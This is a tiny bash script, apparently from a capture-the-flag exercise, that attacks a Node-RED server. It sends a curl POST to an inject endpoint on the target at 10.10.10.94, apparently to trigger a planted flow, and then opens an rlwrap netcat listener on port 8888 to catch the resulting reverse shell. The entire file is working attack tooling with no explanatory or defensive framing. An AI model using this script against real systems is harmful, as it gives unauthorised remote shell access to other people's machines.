#!/usr/bin/env bash

(sleep 0.5; curl -s -X POST http://10.10.10.94:1880/red/a237ac201a5e6c6aa198d974da3705b8/inject/7635e880.e6be48 >/dev/null &)
rlwrap nc -lvnp 8888
